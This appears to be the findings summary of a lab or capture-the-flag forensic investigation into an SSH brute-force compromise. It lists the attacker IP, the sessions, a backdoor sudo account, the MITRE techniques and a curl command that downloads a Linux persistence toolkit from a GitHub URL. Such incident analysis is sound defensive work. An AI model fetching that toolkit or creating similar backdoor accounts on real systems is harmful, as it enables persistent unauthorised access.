# Attacker IP:        65.2.161.68
# Attack Type:        SSH Brute Force (165+ failed attempts)
# Compromised Acct:   root
# Automated Session:  Session 34 — opened/closed same second (06:31:40)
# Manual Session:     Session 37 — opened 06:32:44, closed 06:37:24
# Backdoor Account:   cyberjunkie (UID 1002, sudo group)
# Persistence Script: linper.sh (montysecurity/linper — Linux Persistence Toolkit)
# Script URL:         https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
# Download Command:   sudo /usr/bin/curl <url>
# MITRE Persistence:  T1136.001
# MITRE Escalation:   T1548.003
